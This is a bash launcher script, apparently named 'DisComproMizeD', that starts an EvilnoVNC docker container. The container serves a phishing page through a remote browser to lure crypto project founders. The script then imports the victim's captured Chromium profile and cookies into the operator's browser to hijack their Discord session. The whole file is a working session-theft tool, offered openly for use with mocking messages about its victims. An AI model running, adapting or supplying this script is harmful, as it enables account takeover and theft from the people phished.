#!/bin/bash
#==================================#
#   DisComproMizeD by @Crypt0TDS   #
#   htpps://spoofhub.crypto        #
#==================================#

# Banner
printf "\e[1;34m
   _____  _      _____                                __  __ _         _____  
 |  __ \(_)    / ____|                              |  \/  (_)       |  __ \ 
 | |  | |_ ___| |     ___  _ __ ___  _ __  _ __ ___ | \  / |_ _______| |  | |
 | |  | | / __| |    / _ \| '_ ` _ \| '_ \| '__/ _ \| |\/| | |_  / _ \ |  | |
 | |__| | \__ \ |___| (_) | | | | | | |_) | | | (_) | |  | | |/ /  __/ |__| |
 |_____/|_|___/\_____\___/|_| |_| |_| .__/|_|  \___/|_|  |_|_/___\___|_____/ 
                                    | |                                      
                                    |_|  

\e[1;32m  ---------------- by @Crypt0TDS --------------\n\e[1;0m" 

# Help & Usage
function help {
printf "\n\e[1;33mUsage:\e[1;0m  ./start.sh \e[1;35m\$resolution \e[1;34m\$url\n\n"
printf "\e[1;33mExamples:\n"
printf "\e[1;32m\t1280x720  16bits: \e[1;0m./start.sh \e[1;35m1280x720x16 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1280x720  24bits: \e[1;0m./start.sh \e[1;35m1280x720x24 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1920x1080 16bits: \e[1;0m./start.sh \e[1;35m1920x1080x16 \e[1;34mhttp://example.com\n"
printf "\e[1;32m\t1920x1080 24bits: \e[1;0m./start.sh \e[1;35m1920x1080x24 \e[1;34mhttp://example.com\n\n"
printf "\e[1;33mDynamic resolution:\n"
printf "\e[1;0m\t./start.sh \e[1;35mdynamic \e[1;34mhttp://example.com\n\n";}

if [[ $# -lt 2 ]] ; then help
if [[ $# -lt 2 ]] ; then printf "\e[1;31m[!] Not enough parameters!\n\n"
fi ; exit 0 ; fi

# Variables
RESOLUTION=$1
WEBPAGE=$2

# Main function
if docker -v &> /dev/null ; then
if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
sudo service docker start > /dev/null 2>&1 ; sleep 2 ; fi ; fi

if [[ $RESOLUTION == dynamic ]]; then
sudo rm -f /tmp/res*.txt > /dev/null 2>&1
sudo docker run -d --rm -p 80:80 -v "/tmp:/tmp" -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1

else echo $RESOLUTION > /tmp/resolution.txt
sudo docker run -d --rm -p 80:80 -v "/tmp:/tmp" -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1 ; fi

printf "\n\e[1;33m[>] DisComproMizeD Server is running.." ; sleep 2
printf "\n\e[1;34m[+] URL: http://localhost" ; sleep 2
printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 2

if [[ $RESOLUTION == dynamic ]]; then
printf "\n\e[1;32m[+] Waiting for stoooopid crypto project founder interaction.." ; sleep 2
while [[ ! -f /tmp/resolution.txt ]]; do sleep 5 ; done
RESOLUTION=$(head -1 /tmp/resolution.txt)

else printf "\n\e[1;32m[+] Avoiding dynamic resolution steps.." ; sleep 2 ; fi
printf "\n\e[1;34m[+] Desktop Resolution: $RESOLUTION" ; sleep 2
printf "\n\e[1;32m[+] Cookies will be updated every 30 seconds.. \e[1;31m"

trap 'printf "\n\e[1;33m[>] Compromizing Discord Server .... Yayyyy session imported into Chromium........ Open Chromium and navigate to discord\n" ; sleep 2
sudo docker stop evilnovnc > /dev/null 2>&1 &
rm -Rf ~/.config/chromium/Default > /dev/null 2>&1 ; cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
/bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &
printf "\e[1;32m[+] Done!\n\e[1;0m"' SIGTERM EXIT
while true ; do sleep 30 ; done 
fi
